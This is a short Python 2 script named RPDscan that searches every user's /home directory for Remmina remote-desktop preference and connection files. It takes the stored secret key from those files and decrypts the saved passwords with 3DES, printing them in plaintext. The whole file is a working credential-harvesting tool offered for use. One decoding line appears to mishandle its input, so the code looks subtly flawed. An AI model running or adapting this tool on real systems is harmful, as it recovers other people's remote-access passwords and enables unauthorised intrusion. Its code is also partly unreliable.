import base64
from Crypto.Cipher import DES3
import os
import subprocess
import re

#### freakyclowns AMES ##################################
# RPDscan - Remmina Password Decorder/scanner		#				
#	   						#
# This tool searches the /home directory for users      #
# Remmina preference and config files, then does some   #
# magic to decode any saved passwords it finds          #
#							#
#########################################################

# Changelog
# 0.1 alpha 3/april/2014

####  usage #####################################
#						#
# python RPDscan.py 				#
#						#
#################################################




def decodewithscience(sekrit,passd):
	cutsekrit = sekrit.split('=',1)
	cutpassd = passd.split('=',1)
	secret = base64.decodestring(str(cutsekrit[1]))
	password = base64.decodestring(str(cutpassd[1:]))
	print DES3.new(secret[:24],DES3.MODE_CBC,secret[24:]).decrypt(password)

def findconfs(sek):

	remconf = subprocess.Popen("find /home/ -type f -name *.remmina", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

	for line in remconf.stdout:
	        with open(line.strip(), 'r') as inF:
	            for linex in inF:
	                if 'password' in linex:
	                        if linex == "password=\n":
					print "found a conf file", line,
	                                print "no saved password sorry!"
	                        else:
					print "found a conf file", line, 
					decodewithscience(sek,linex)
					print ""

def findprefs():
	rempref = subprocess.Popen("find /home/ -name remmina.pref", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
	for line in rempref.stdout:
		print "found this pref file", line
	        with open(line.strip(), 'r') as inF:
	            for lineb in inF:
	                if 'secret' in lineb:
	                        isecret = lineb
				findconfs(isecret)



findprefs()


